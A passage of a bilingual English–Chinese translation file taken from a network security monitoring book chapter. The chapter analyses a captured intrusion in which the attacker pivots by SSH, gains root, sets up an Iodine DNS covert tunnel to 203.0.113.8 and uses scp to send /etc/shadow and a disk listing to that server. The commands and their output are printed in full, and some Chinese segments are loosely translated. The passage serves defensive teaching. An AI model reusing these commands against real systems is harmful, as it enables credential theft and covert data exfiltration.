  zh: '**256** 第 11 章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1177
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Pivoting to a Second Victim***'
  id: totrans-1178
  prefs: []
  type: TYPE_NORMAL
  zh: '***转向第二个受害者***'
- en: Next, as shown in Listing 11-21, it appears that the intruder is connecting
  id: totrans-1179
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，如清单 11-21 所示，入侵者似乎正在连接
- en: from the first victim, 172.16.0.37, via SSH as user ubu32 to a second victim,
  id: totrans-1180
  prefs: []
  type: TYPE_NORMAL
  zh: 从第一个受害者 172.16.0.37 通过 SSH 以 ubu32 用户身份传输到第二个受害者，
- en: 10.0.0.99\. This is followed by the login prompt on 10.0.0.99, another Linux
  id: totrans-1181
  prefs: []
  type: TYPE_NORMAL
  zh: 10.0.0.99\. 接着在 10.0.0.99 上显示登录提示，另一个 Linux
- en: system that’s running the same kernel. It advertises itself as an Ubuntu
  id: totrans-1182
  prefs: []
  type: TYPE_NORMAL
  zh: 运行相同内核的系统。它将自己标识为 Ubuntu 系统
- en: 12.0.4.2 LTS distribution.
  id: totrans-1183
  prefs: []
  type: TYPE_NORMAL
  zh: 12.0.4.2 LTS 版本。
- en: 'DST: ................core_channel_write....)....21495256091063571385331835436694........2......'
  id: totrans-1184
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ................core_channel_write....)....21495256091063571385331835436694........2......'
- en: '.....4**ssh ubu32@10.0.0.99**'
  id: totrans-1185
  prefs: []
  type: TYPE_NORMAL
  zh: '.....4**ssh ubu32@10.0.0.99**'
- en: 'SRC: ..U...........2...........4**Welcome to Ubuntu 12.04.2 LTS** (GNU/Linux
    3.5.0-25-generic i686) SRC:'
  id: totrans-1186
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..U...........2...........4**欢迎使用 Ubuntu 12.04.2 LTS** (GNU/Linux 3.5.0-25-generic
    i686) SRC:'
- en: 'SRC: * Documentation: https://help.ubuntu.com/'
  id: totrans-1187
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: * 文档：https://help.ubuntu.com/'
- en: 'SRC:'
  id: totrans-1188
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC:'
- en: 'SRC: 0 packages can be updated.'
  id: totrans-1189
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: 0 个软件包可以更新。'
- en: 'SRC: 0 updates are security updates.'
  id: totrans-1190
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: 0 个更新是安全更新。'
- en: '*Listing 11-21: Ubuntu connection to another victim*'
  id: totrans-1191
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-21: Ubuntu 连接到另一个受害者*'
- en: By running sudo bash, as shown in Listing 11-22, the intruder escalates
  id: totrans-1192
  prefs: []
  type: TYPE_NORMAL
  zh: 通过运行 sudo bash，如列表 11-22 所示，攻击者提升了
- en: his access to root privileges.
  id: totrans-1193
  prefs: []
  type: TYPE_NORMAL
  zh: 他获得了 root 权限。
- en: 'DST: ...v............core_channel_write....)....29459743353766825927232004106327........2......'
  id: totrans-1194
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...v............core_channel_write....)....29459743353766825927232004106327........2......'
- en: '.....4sudo bash'
  id: totrans-1195
  prefs: []
  type: TYPE_NORMAL
  zh: '.....4sudo bash'
- en: 'DST: ...........'
  id: totrans-1196
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...........'
- en: 'DST:'
  id: totrans-1197
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST:'
- en: 'SRC: .'
  id: totrans-1198
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..d............core_channel_write....)....29459743353766825927232004106327............'
  id: totrans-1199
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..d............core_channel_write....)....29459743353766825927232004106327............'
- en: 'SRC: ............'
  id: totrans-1200
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ............'
- en: 'SRC: ...w...........2...........4**sudo bash**'
  id: totrans-1201
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ...w...........2...........4**sudo bash**'
- en: 'SRC: ....................core_channel_write....)....UJUHVDEWIYIKWPCUMRTWODZUIDRXEMKG.'
  id: totrans-1202
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ....................core_channel_write....)....UJUHVDEWIYIKWPCUMRTWODZUIDRXEMKG.'
- en: 'SRC: .'
  id: totrans-1203
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..............2.......#...4[sudo] password for ubu32: ....................core_channel_'
  id: totrans-1204
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..............2.......#...4[sudo] ubu32 的密码：....................core_channel_'
- en: write....)....JTCKKYYZSXEFTWGOEWDZKWHCOLJYUWZG.
  id: totrans-1205
  prefs: []
  type: TYPE_NORMAL
  zh: 写入....)....JTCKKYYZSXEFTWGOEWDZKWHCOLJYUWZG.
- en: 'DST: ...v............core_channel_write....)....56755805437825017718244048581240........2......'
  id: totrans-1206
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...v............core_channel_write....)....56755805437825017718244048581240........2......'
- en: '.....4wonderubu'
  id: totrans-1207
  prefs: []
  type: TYPE_NORMAL
  zh: '.....4wonderubu'
- en: '*Listing 11-22: Access escalation with sudo bash*'
  id: totrans-1208
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-22: 使用 sudo bash 提升权限*'
- en: '***Instal ing a Covert Tunnel***'
  id: totrans-1209
  prefs: []
  type: TYPE_NORMAL
  zh: '***安装隐蔽隧道***'
- en: As root, the intruder now installs the Iodine DNS covert tunnel tool via
  id: totrans-1210
  prefs: []
  type: TYPE_NORMAL
  zh: 作为 root，攻击者现在通过 dpkg 安装 Iodine DNS 隐蔽隧道工具，
- en: dpkg -i iodine_0.6.0~rc1-7_i386.deb, as shown in Listing 11-23\.
  id: totrans-1211
  prefs: []
  type: TYPE_NORMAL
  zh: dpkg -i iodine_0.6.0~rc1-7_i386.deb，如列表 11-23 所示\。
- en: 'DST: ................core_channel_write....)....64642638366982677090891088802167........2......'
  id: totrans-1212
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ................core_channel_write....)....64642638366982677090891088802167........2......'
- en: .,...4**dpkg -i iodine_0.6.0~rc1-7_i386.deb**
  id: totrans-1213
  prefs: []
  type: TYPE_NORMAL
  zh: .,...4**dpkg -i iodine_0.6.0~rc1-7_i386.deb**
- en: '*Listing 11-23: Iodine DNS covert tunnel tool instal ation*'
  id: totrans-1214
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-23: 安装 Iodine DNS 隐蔽隧道工具*'
- en: Client-side Compromise **257**
  id: totrans-1215
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端侧妥协 **257**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1216
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Next, we see that the intruder starts the Iodine tool with the command iodine
    -r 203.0.113.8 practicalnsm.com, as shown in Listing 11-24\. He is starting the
    Iodine client, pointing it to a server at 203.0.113.8, with DNS traffic
  id: totrans-1217
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们看到攻击者使用命令 iodine -r 203.0.113.8 practicalnsm.com 启动 Iodine 工具，如列表 11-24
    所示。他正在启动 Iodine 客户端，并将其指向位于 203.0.113.8 的服务器，通过 DNS 流量
- en: using the *practicalnsm.com* domain. (I wonder who caused this intrusion?)
  id: totrans-1218
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 *practicalnsm.com* 域名。（我想知道是谁造成了这次入侵？）
- en: Because the attacker initiates Iodine in this manner, it looks like the victim,
  id: totrans-1219
  prefs: []
  type: TYPE_NORMAL
  zh: 因为攻击者以这种方式启动 Iodine，所以看起来像是受害者，
- en: 10.0.0.99, will communicate directly with an Iodine server at 203.0.113.8\.
  id: totrans-1220
  prefs: []
  type: TYPE_NORMAL
  zh: 10.0.0.99 将直接与位于 203.0.113.8 的 Iodine 服务器进行通信\。
- en: (There is no need to communicate with a DNS server when Iodine is run in
  id: totrans-1221
  prefs: []
  type: TYPE_NORMAL
  zh: （在运行 Iodine 时，不需要与 DNS 服务器进行通信，
- en: this manner, but the covert traffic will still appear as DNS.)
  id: totrans-1222
  prefs: []
  type: TYPE_NORMAL
  zh: 以这种方式运行，但隐蔽流量仍然会表现为 DNS。)
- en: 'DST: ................core_channel_write....)....54112282595894012391779534721588........2......'
  id: totrans-1223
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ................core_channel_write....)....54112282595894012391779534721588........2......'
- en: ./...4**iodine -r** **203.0.113.8 practicalnsm.com**
  id: totrans-1224
  prefs: []
  type: TYPE_NORMAL
  zh: ./...4**iodine -r** **203.0.113.8 practicalnsm.com**
- en: '*Listing 11-24: Iodine tool startup*'
  id: totrans-1225
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-24: 启动 Iodine 工具*'
- en: Listing 11-25 likely shows output received from the Iodine server. We
  id: totrans-1226
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-25 很可能显示了从 Iodine 服务器收到的输出。我们
- en: see that the server IP address is 10.10.0.1, which tells us that there is a
    VPN
  id: totrans-1227
  prefs: []
  type: TYPE_NORMAL
  zh: 可以看到服务器 IP 地址是 10.10.0.1，这告诉我们存在一个 VPN
- en: sort of channel between 10.0.0.99 and 203.0.113.8\. Now the two computers
  id: totrans-1228
  prefs: []
  type: TYPE_NORMAL
  zh: 可以看到，10.0.0.99 和 203.0.113.8 之间建立了一条通道。现在，这两台计算机
- en: can communicate with each other via IP addresses like 10.10.0.1 for the
  id: totrans-1229
  prefs: []
  type: TYPE_NORMAL
  zh: 可以通过 IP 地址（如 10.10.0.1）彼此通信。
- en: server, rather than 203.0.113.8\. (The Iodine tool encapsulates the intruder’s
  id: totrans-1230
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器权限，而不是 203.0.113.8\. （Iodine 工具封装了攻击者的
- en: communications in DNS traffic.)
  id: totrans-1231
  prefs: []
  type: TYPE_NORMAL
  zh: DNS 流量中的通信。)
- en: 'SRC: ....................core_channel_write....)....'
  id: totrans-1232
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ....................core_channel_write....)....'
- en: WXQSRQPTXGMIWNZFNDHOHWTCFEJDDKUF................2.......:...4**Server tunnel
    IP is 10.10.0.1**
  id: totrans-1233
  prefs: []
  type: TYPE_NORMAL
  zh: WXQSRQPTXGMIWNZFNDHOHWTCFEJDDKUF................2.......:...4**服务器隧道 IP 是 10.10.0.1**
- en: '*Listing 11-25: Output from the Iodine server*'
  id: totrans-1234
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-25: 来自 Iodine 服务器的输出*'
- en: To test connectivity, the intruder uses the ping utility to contact 10.10.0.1,
  id: totrans-1235
  prefs: []
  type: TYPE_NORMAL
  zh: 为了测试连接性，入侵者使用 ping 工具联系 10.10.0.1，
- en: the IP address at the other end of the tunnel, as shown in Listing 11-26\. The
  id: totrans-1236
  prefs: []
  type: TYPE_NORMAL
  zh: 隧道另一端的 IP 地址，如列表 11-26 所示。
- en: remote system replies, and the tunnel is working. An NSM sensor will not
  id: totrans-1237
  prefs: []
  type: TYPE_NORMAL
  zh: 远程系统回复，隧道工作正常。NSM 传感器将无法
- en: see ICMP traffic, but it will start seeing odd DNS activity.
  id: totrans-1238
  prefs: []
  type: TYPE_NORMAL
  zh: 看到 ICMP 流量，但它将开始看到奇怪的 DNS 活动。
- en: 'SRC: ...............2...........4**ping -c** 3 **10.10.0.1**'
  id: totrans-1239
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ...............2...........4**ping -c** 3 **10.10.0.1**'
- en: 'SRC: ....................core_channel_write....)....BGCEPMSGLBOFCPOHKXSKOAMVWVCRDKFU.'
  id: totrans-1240
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ....................core_channel_write....)....BGCEPMSGLBOFCPOHKXSKOAMVWVCRDKFU.'
- en: 'SRC: .'
  id: totrans-1241
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..............2.......:...4**PING 10.10.0.1 (10.10.0.1) 56(84) bytes of
    data.**'
  id: totrans-1242
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..............2.......:...4**PING 10.10.0.1 (10.10.0.1) 56(84) 字节的数据。**'
- en: 'SRC: ...........2........core_channel_write....)....GSFTPZWPJXAREZEXEEALKFUBCUSRLPEK.'
  id: totrans-1243
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ...........2........core_channel_write....)....GSFTPZWPJXAREZEXEEALKFUBCUSRLPEK.'
- en: 'SRC: .'
  id: totrans-1244
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..............2.......A...464 bytes from 10.10.0.1: icmp_req=1 ttl=64
    time=2.07 ms SRC: ...........9........core_channel_write....)....MUNJGYKCWWYETWKFZOWTIVKVAQNLKNCQ.'
  id: totrans-1245
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..............2.......A...464 字节来自 10.10.0.1: icmp_req=1 ttl=64 时间=2.07
    毫秒 SRC: ...........9........core_channel_write....)....MUNJGYKCWWYETWKFZOWTIVKVAQNLKNCQ.'
- en: 'SRC: .'
  id: totrans-1246
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..............2.......A...464 bytes from 10.10.0.1: icmp_req=2 ttl=64
    time=1.15 ms SRC: ...........9........core_channel_write....)....JLCWSBHPCCBTZFUVTJUYBYQVUOXEZPPF.'
  id: totrans-1247
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..............2.......A...464 字节来自 10.10.0.1: icmp_req=2 ttl=64 时间=1.15
    毫秒 SRC: ...........9........core_channel_write....)....JLCWSBHPCCBTZFUVTJUYBYQVUOXEZPPF.'
- en: 'SRC: .'
  id: totrans-1248
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..Q...........2...........464 bytes from 10.10.0.1: icmp_req=3 ttl=64
    time=1.12 ms SRC:'
  id: totrans-1249
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..Q...........2...........464 字节来自 10.10.0.1: icmp_req=3 ttl=64 时间=1.12
    毫秒 SRC:'
- en: 'SRC: --- 10.10.0.1 ping statistics ---'
  id: totrans-1250
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: --- 10.10.0.1 ping 统计 ---'
- en: 'SRC: 3 packets transmitted, 3 received, 0% packet loss, time 2003ms'
  id: totrans-1251
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: 3 个数据包传输，3 个接收，0% 丢包，时间 2003 毫秒'
- en: 'SRC: rtt min/avg/max/mdev = 1.128/1.453/2.073/0.439 ms'
  id: totrans-1252
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: rtt 最小/平均/最大/偏差 = 1.128/1.453/2.073/0.439 毫秒'
- en: '*Listing 11-26: Ping test for tunnel connectivity*'
  id: totrans-1253
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-26：隧道连接性 Ping 测试*'
- en: '**258** Chapter 11'
  id: totrans-1254
  prefs: []
  type: TYPE_NORMAL
  zh: '**258** 第 11 章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1255
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Enumerating the Victim***'
  id: totrans-1256
  prefs: []
  type: TYPE_NORMAL
  zh: '***枚举受害者***'
- en: Now the intruder turns to enumerating the victim. He prints the output of
  id: totrans-1257
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，入侵者开始枚举受害者。他打印出以下内容：
- en: the */etc/shadow* file, which contains password hashes. Listing 11-27 shows
  id: totrans-1258
  prefs: []
  type: TYPE_NORMAL
  zh: 该 */etc/shadow* 文件，其中包含密码哈希值。列表 11-27 显示了
- en: part of this file.
  id: totrans-1259
  prefs: []
  type: TYPE_NORMAL
  zh: 该文件的一部分。
- en: 'SRC: root@intubu32:~# ....................core_channel_write....)....'
  id: totrans-1260
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: root@intubu32:~# ....................core_channel_write....)....'
- en: LBTPOVHNRBVNFEXWLPWAAXXSYKEYJQMW.
  id: totrans-1261
  prefs: []
  type: TYPE_NORMAL
  zh: LBTPOVHNRBVNFEXWLPWAAXXSYKEYJQMW.
- en: 'DST: ...|............core_channel_write....)....76703429583552950498014447957238........2......'
  id: totrans-1262
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...|............core_channel_write....)....76703429583552950498014447957238........2......'
- en: '.....4**cat /etc/shadow**'
  id: totrans-1263
  prefs: []
  type: TYPE_NORMAL
  zh: '.....4**cat /etc/shadow**'
- en: 'DST: ............'
  id: totrans-1264
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ............'
- en: 'SRC: .'
  id: totrans-1265
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..d............core_channel_write....)....76703429583552950498014447957238...............'
  id: totrans-1266
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..d............core_channel_write....)....76703429583552950498014447957238...............'
- en: '..........'
  id: totrans-1267
  prefs: []
  type: TYPE_NORMAL
  zh: '..........'
- en: 'SRC: ...............2...........4cat /etc/shadow'
  id: totrans-1268
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ...............2...........4cat /etc/shadow'
- en: 'SRC: root:!:15773:0:99999:7:::'
  id: totrans-1269
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: root:!:15773:0:99999:7:::'
- en: 'SRC: daemon:*:15749:0:99999:7:::'
  id: totrans-1270
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: daemon:*:15749:0:99999:7:::'
- en: 'SRC: bin:*:15749:0:99999:7:::'
  id: totrans-1271
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: bin:*:15749:0:99999:7:::'
- en: 'SRC: sys:*:15749:0:99999:7:::'
  id: totrans-1272
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: sys:*:15749:0:99999:7:::'
- en: 'SRC: sync:*:15749:0:99999:7:::'
  id: totrans-1273
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: sync:*:15749:0:99999:7:::'
- en: 'SRC: games:*:15749:0:99999:7:::'
  id: totrans-1274
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: games:*:15749:0:99999:7:::'
- en: 'SRC: man:*:15749:0:99999:7:::'
  id: totrans-1275
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: man:*:15749:0:99999:7:::'
- en: 'SRC: lp:*:15749:0:99999:7:::'
  id: totrans-1276
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: lp:*:15749:0:99999:7:::'
- en: '*Listing 11-27: Contents of the* /etc/shadow *file*'
  id: totrans-1277
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-27：* /etc/shadow *文件的内容*'
- en: As shown in Listing 11-28, the intruder uses scp to copy the */etc/shadow*
  id: totrans-1278
  prefs: []
  type: TYPE_NORMAL
  zh: 如列表 11-28 所示，入侵者使用 scp 命令复制 */etc/shadow*
- en: file to 10.10.0.1, the server on the other side of the Iodine covert channel.
  id: totrans-1279
  prefs: []
  type: TYPE_NORMAL
  zh: 文件传输到 10.10.0.1，即隐蔽通道另一端的服务器。
- en: He connects as user raybourque and copies the file to Ray’s home directory.
  id: totrans-1280
  prefs: []
  type: TYPE_NORMAL
  zh: 他以用户 raybourque 登录，并将文件复制到 Ray 的主目录。
- en: His password is Bru1ns. I like this guy. (Note that by using scp, the transfer
    is
  id: totrans-1281
  prefs: []
  type: TYPE_NORMAL
  zh: 他的密码是 Bru1ns。我喜欢这个人。（注意，通过使用 scp，传输是
- en: encrypted within the DNS covert channel.)
  id: totrans-1282
  prefs: []
  type: TYPE_NORMAL
  zh: 加密的 DNS 隐蔽通道中的内容。)
- en: 'SRC: ..............2.......@...4**scp /etc/shadow raybourque@10.10.0.1:/home/raybourque/**'
  id: totrans-1283
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..............2.......@...4**scp /etc/shadow raybourque@10.10.0.1:/home/raybourque/**'
- en: 'DST: ...s............core_channel_write....)....12979532812626493965961252667084........2......'
  id: totrans-1284
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...s............core_channel_write....)....12979532812626493965961252667084........2......'
- en: '.....4**Bru1ns**'
  id: totrans-1285
  prefs: []
  type: TYPE_NORMAL
  zh: '.....4**Bru1ns**'
- en: 'SRC: **shadow** 100% 1121 1.1KB/s 00:00'
  id: totrans-1286
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: **shadow** 100% 1121 1.1KB/s 00:00'
- en: '*Listing 11-28: Copying the* /etc/shadow *file*'
  id: totrans-1287
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-28：复制* /etc/shadow *文件*'
- en: The intruder next creates a recursive directory listing of the entire hard
  id: totrans-1288
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，入侵者创建整个硬盘的递归目录列表
- en: drive and puts the contents in a file titled *intubu32.ls-alR.txt*, as shown
    in Listing 11-29\.
  id: totrans-1289
  prefs: []
  type: TYPE_NORMAL
  zh: 将驱动器内容放入名为*intubu32.ls-alR.txt*的文件中，如清单 11-29 所示。
- en: 'DST: ................core_channel_write....)....67917540968083609031577076644751........2....'
  id: totrans-1290
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ................core_channel_write....)....67917540968083609031577076644751........2....'
- en: '...(...4**ls -alR / > intubu32.ls-alR.txt**'
  id: totrans-1291
  prefs: []
  type: TYPE_NORMAL
  zh: '...(...4**ls -alR / > intubu32.ls-alR.txt**'
- en: '*Listing 11-29: Creating a recursive directory listing of the hard drive*'
  id: totrans-1292
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 11-29: 创建硬盘的递归目录列表*'
- en: After creating the file, the intruder again uses scp to transfer it to his
  id: totrans-1293
  prefs: []
  type: TYPE_NORMAL
  zh: 在创建文件后，入侵者再次使用 scp 将其传输到他的
- en: server as user raybourque, as shown in Listing 11-30\.
  id: totrans-1294
  prefs: []
  type: TYPE_NORMAL
  zh: 作为用户 raybourque 登录的服务器，如清单 11-30 所示。
- en: Client-side Compromise **259**
  id: totrans-1295
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端侧妥协 **259**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1296
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'SRC: ..............2...........4**scp intubu32.ls-alR.txt raybourque@10.10.0.1:/home/raybourque**
    **SRC: <32.ls-alR.txt** raybourque@10.10.0.1:/home/raybourque'
  id: totrans-1297
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..............2...........4**scp intubu32.ls-alR.txt raybourque@10.10.0.1:/home/raybourque**
    **SRC: <32.ls-alR.txt** raybourque@10.10.0.1:/home/raybourque'
- en: '........................./'
  id: totrans-1298
  prefs: []
  type: TYPE_NORMAL
  zh: '........................./'
- en: 'SRC: ....................core_channel_write....)....USSCEEVDBIGFIRWOSESCHCUWSDAZFPJS.'
  id: totrans-1299
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ....................core_channel_write....)....USSCEEVDBIGFIRWOSESCHCUWSDAZFPJS.'
- en: 'SRC: .'
  id: totrans-1300
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..u...........2...........4Password:....................core_channel_write....)....'
  id: totrans-1301
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..u...........2...........4密码:....................core_channel_write....)....'
- en: GUTYMDXFGXQWFPYSCFKMNPZTQEKYHWYC.
  id: totrans-1302
  prefs: []
  type: TYPE_NORMAL
  zh: GUTYMDXFGXQWFPYSCFKMNPZTQEKYHWYC.
- en: 'DST: ...s............core_channel_write....)....56606769242836968330355877691782........2......'
  id: totrans-1303
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...s............core_channel_write....)....56606769242836968330355877691782........2......'
- en: '.....4Bru1ns'
  id: totrans-1304
  prefs: []
  type: TYPE_NORMAL
  zh: '.....4Bru1ns'
- en: '*Listing 11-30: Transfer of hard drive file listing to intruder’s server*'
  id: totrans-1305
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 11-30: 将硬盘文件列表传输到入侵者的服务器*'
- en: That’s the end of the transcript.
  id: totrans-1306
  prefs: []
  type: TYPE_NORMAL
  zh: 这就是转录的结束。
- en: '***Summarizing Stage 2***'
  id: totrans-1307
  prefs: []
  type: TYPE_NORMAL
  zh: '***总结阶段 2***'
- en: In the second half of this intrusion, the intruder, still operating from
  id: totrans-1308
  prefs: []
  type: TYPE_NORMAL
  zh: 在这次入侵的后半段，入侵者仍然通过
- en: 203.0.113.15, used stolen credentials to connect via SSH from 172.16.0.37
  id: totrans-1309
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.15，使用被盗凭证通过 SSH 从 172.16.0.37 连接
- en: to 10.0.0.9\. He copied a DNS covert tunnel tool to the second victim and
  id: totrans-1310
  prefs: []
  type: TYPE_NORMAL
  zh: 到 10.0.0.9。他将一个 DNS 隐蔽通道工具复制到第二个受害者的系统中，并
- en: configured it to speak to a new intruder system at 203.0.113.8\. The intruder
  id: totrans-1311
  prefs: []
  type: TYPE_NORMAL
  zh: 将其配置为与新的入侵者系统 203.0.113.8 通信。入侵者
- en: activated the covert tunnel, and we saw that it communicated via DNS
  id: totrans-1312
  prefs: []
  type: TYPE_NORMAL
  zh: 激活了隐蔽通道，我们看到它通过 DNS 进行通信
- en: requests and replies. Within the covert tunnel, the intruder copied sensitive
  id: totrans-1313
  prefs: []
  type: TYPE_NORMAL
  zh: 请求和回复。在隐蔽通道内，入侵者复制了敏感数据
- en: data enumerated from the second victim, 10.0.0.9\. Figure 11-18 summarizes
  id: totrans-1314
  prefs: []
  type: TYPE_NORMAL
  zh: 从第二个受害者 10.0.0.9 获取的数据，图 11-18 总结了
- en: these actions.
  id: totrans-1315
  prefs: []
  type: TYPE_NORMAL
  zh: 这些操作。
- en: 1\. Intruder pivots from Victim 1 to Victim 2\.
  id: totrans-1316
  prefs: []
  type: TYPE_NORMAL
  zh: 1\. 入侵者从受害者 1 转向受害者 2\。
- en: NETWORK CONNECTION
  id: totrans-1317
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: Intruder 1
  id: totrans-1318
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: Victim 1
  id: totrans-1319
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 1
- en: 203.0.113.15
  id: totrans-1320
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.15
- en: 172.16.0.37
  id: totrans-1321
  prefs: []
  type: TYPE_NORMAL
  zh: 172.16.0.37
- en: Victim 2
  id: totrans-1322
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 2
- en: 10.0.0.99
  id: totrans-1323
  prefs: []
  type: TYPE_NORMAL
  zh: 10.0.0.99
- en: 2\. Intruder installs DNS covert tunnel tool and creates
  id: totrans-1324
  prefs: []
  type: TYPE_NORMAL
  zh: 2\. 入侵者安装 DNS 隐蔽通道工具并创建
- en: channel to second intruder system (Intruder 2).
  id: totrans-1325
  prefs: []
  type: TYPE_NORMAL
  zh: 通道到第二个入侵者系统（入侵者 2）。
- en: NETWORK CONNECTION
  id: totrans-1326
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: Intruder 2
  id: totrans-1327
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 2
- en: Victim 2
  id: totrans-1328
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 2
- en: 203.0.113.8
  id: totrans-1329
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.8
- en: 10.0.0.99
  id: totrans-1330
  prefs: []
  type: TYPE_NORMAL
  zh: 10.0.0.99
- en: 3\. Within covert tunnel, intruder copies sensitive
  id: totrans-1331
  prefs: []
  type: TYPE_NORMAL
  zh: 3\. 在隐蔽通道内，入侵者复制敏感
- en: data from Victim 2 to Intruder 2\.
  id: totrans-1332
  prefs: []
  type: TYPE_NORMAL
  zh: 从受害者 2 到入侵者 2 的数据\。
- en: NETWORK CONNECTION
  id: totrans-1333
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: Intruder 2
  id: totrans-1334
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 2
- en: Victim 2
  id: totrans-1335
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 2
- en: 203.0.113.8
  id: totrans-1336
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.8
- en: 10.0.0.99
  id: totrans-1337
  prefs: []
  type: TYPE_NORMAL
  zh: 10.0.0.99
- en: '*Figure 11-18: A summary of stage 2 of the server-side compromise*'
  id: totrans-1338
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-18: 服务器端妥协的阶段 2 总结*'
- en: '**260** Chapter 11'
  id: totrans-1339
  prefs: []
  type: TYPE_NORMAL
  zh: '**260** 第 11 章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1340
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
